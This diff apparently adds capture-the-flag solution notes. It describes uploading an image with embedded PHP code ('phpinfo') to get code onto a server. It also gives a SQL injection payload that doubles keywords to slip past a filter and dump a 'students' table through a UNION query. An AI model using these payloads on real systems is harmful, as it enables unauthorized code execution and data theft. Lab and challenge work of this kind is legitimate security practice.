@@ -1,0 +1,2 @@
+[Agent RFI] Upload an image file with this basic php syntax injected in  body of image <?php phpinfo();?>. This plants an agent RFI. check different fileds of RFI students tables to get the flag.
+abcd' uniounionn selecselectt 'aaa',bio,'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj','kkk' from student whewherere name like '%RFI%' #Comment
